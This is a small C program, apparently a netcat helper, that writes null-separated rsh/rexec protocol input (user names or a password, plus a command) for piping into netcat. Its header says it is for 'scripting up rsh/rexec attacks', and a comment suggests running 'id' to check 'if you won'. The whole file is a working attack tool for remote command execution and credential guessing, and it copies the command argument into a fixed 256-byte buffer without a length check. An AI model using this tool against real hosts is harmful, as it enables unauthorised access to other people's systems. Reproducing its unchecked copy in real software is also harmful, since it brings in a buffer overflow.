/* generate ^@string1^@string2^@cmd^@ input to netcat, for scripting up
   rsh/rexec attacks.  Needs to be a prog because shells strip out nulls.

   args:
	locuser remuser [cmd]
	remuser passwd [cmd]

   cmd defaults to "pwd".

   ... whatever.  _H*/

#include <stdio.h>

/* change if you like; "id" is a good one for figuring out if you won too */
static char cmd[] = "pwd";

static char buf [256];

main(argc, argv)
  int argc;
  char * argv[];
{
  register int x;
  register int y;
  char * p;
  char * q;

  p = buf;
  memset (buf, 0, 256);

  p++;				/* first null */
  y = 1;

  if (! argv[1])
    goto wrong;
  x = strlen (argv[1]);
  memcpy (p, argv[1], x);	/* first arg plus another null */
  x++;
  p += x;
  y += x;

  if (! argv[2])
    goto wrong;
  x = strlen (argv[2]);
  memcpy (p, argv[2], x);	/* second arg plus null */
  x++;
  p += x;
  y += x;

  q = cmd;
  if (argv[3])
    q = argv[3];
  x = strlen (q);		/* not checked -- bfd */
  memcpy (p, q, x);		/* the command, plus final null */
  x++;
  p += x;
  y += x;

  memcpy (p, "\n", 1);		/* and a newline, so it goes */
  y++;

  write (1, buf, y);		/* zot! */
  exit (0);

wrong:
  fprintf (stderr, "wrong!  needs 2 or more args.\n");
  exit (1);
}
